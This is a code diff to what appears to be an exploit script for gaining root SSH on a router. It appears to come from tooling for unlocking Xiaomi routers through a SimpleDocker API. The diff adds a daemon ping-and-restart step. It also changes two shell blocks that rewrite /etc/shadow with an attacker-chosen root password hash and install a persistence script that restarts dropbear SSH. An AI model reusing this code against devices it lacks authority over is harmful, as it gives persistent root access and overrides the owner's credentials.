@@ -166,6 +166,30 @@ except Exception:
 auth = {'Authorization': token}
 print('[connect8] SimpleDocker login OK')
 
+# ── stage 2b: ensure Docker daemon is connected (ping + auto-restart) ─────────
+
+def _docker_ping():
+    try:
+        r = requests.get(f'http://{router_ip}:{DOCKER_PORT}/api/docker/info',
+                         headers=auth, timeout=5)
+        return r.status_code == 200
+    except Exception:
+        return False
+
+if not _docker_ping():
+    print('[connect8] Docker daemon not responding — restarting SimpleDocker connection ...')
+    try:
+        requests.post(f'http://{router_ip}:{DOCKER_PORT}/api/system/safe',
+                      headers=auth, timeout=8)
+    except Exception:
+        pass
+    time.sleep(4)
+    if not _docker_ping():
+        raise ExploitNotWorked(
+            'connect8: Docker daemon is not running.\n'
+            '       Try toggling Docker in SimpleDocker web UI or reboot the router.')
+    print('[connect8] Docker daemon OK')
+
 # ── stage 3: find a running container ─────────────────────────────────────────
 
 try:
@@ -324,7 +348,8 @@ grep -q '"release"' /etc/init.d/dropbear 2>/dev/null && \\
 KEYFILE=/etc/dropbear/dropbear_rsa_host_key
 [ -s "$KEYFILE" ] || /usr/bin/dropbearkey -t rsa -f "$KEYFILE" 2>/dev/null
 HASH=$(openssl passwd -1 -salt 'XMiR1337' '{SSH_PASSWORD}')
-{{ grep -v '^root:' /etc/shadow; printf 'root:%s:19000:0:99999:7:::' "$HASH"; }} > /tmp/_sh && mv /tmp/_sh /etc/shadow
+SHADOW_FILE=$(readlink -f /etc/shadow 2>/dev/null || echo /etc/shadow)
+{{ grep -v '^root:' "$SHADOW_FILE"; printf 'root:%s:19000:0:99999:7:::' "$HASH"; }} > /tmp/_sh && mv /tmp/_sh "$SHADOW_FILE"
 pgrep dropbear > /dev/null || /etc/init.d/dropbear start 2>/dev/null
 PERSIST_EOF
 chmod +x /data/xmir_restore_ssh.sh
@@ -360,7 +385,8 @@ echo "keyfile=$([ -f $KEYFILE ] && echo ok || echo missing)" >> "$LOG"
 # 4. Root password  (MD5-crypt hash pre-computed, no openssl dependency)
 HASH=$(openssl passwd -1 -salt 'XMiR1337' '{SSH_PASSWORD}' 2>/dev/null)
 [ -z "$HASH" ] && HASH='{_md5_hash}'
-{{ grep -v '^root:' /etc/shadow; printf 'root:%s:19000:0:99999:7:::\\n' "$HASH"; }} > /tmp/_sh && mv /tmp/_sh /etc/shadow
+SHADOW_FILE=$(readlink -f /etc/shadow 2>/dev/null || echo /etc/shadow)
+{{ grep -v '^root:' "$SHADOW_FILE"; printf 'root:%s:19000:0:99999:7:::\\n' "$HASH"; }} > /tmp/_sh && mv /tmp/_sh "$SHADOW_FILE"
 grep -c '^root:.*:19000:' /etc/shadow >> "$LOG" && echo "passwd=set" >> "$LOG" || echo "passwd=FAIL" >> "$LOG"
 
 # 5. Start SSH via procd
